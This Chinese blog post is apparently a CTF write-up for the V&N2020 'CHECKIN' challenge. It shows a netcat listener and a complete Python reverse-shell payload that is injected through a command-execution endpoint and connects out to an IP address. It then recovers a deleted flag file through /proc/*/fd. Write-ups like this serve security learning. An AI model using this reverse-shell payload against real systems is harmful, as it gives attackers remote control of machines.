---
title: '[V&N2020 公开赛]CHECKIN'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-17 15:34:29
authorLink:
tags: 弹shell
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1094117.jpg
---
整理源码得

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200817153855.png)

shell()中有命令执行函数，可惜没有回显。

知识点
在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag.txt）在/proc/[pid]/fd下还是会存在,所以我们还是可以看flag,txt的。

网上找的一个弹shell payload的总结：
https://www.cnblogs.com/20175211lyz/p/12397933.html

随意监听一个端口： nc -lvp 1234

payload：shell?c=python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.0.63.198',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])

然后就可以命令执行了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/hadheah.jpg)

查看/proc/[pid[/fd 里的文件
由于有很多[pid]我们可以直接用*来代替，省的一步一步去找

cat /proc/*/fd/*

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/hbdthsdh.jpg)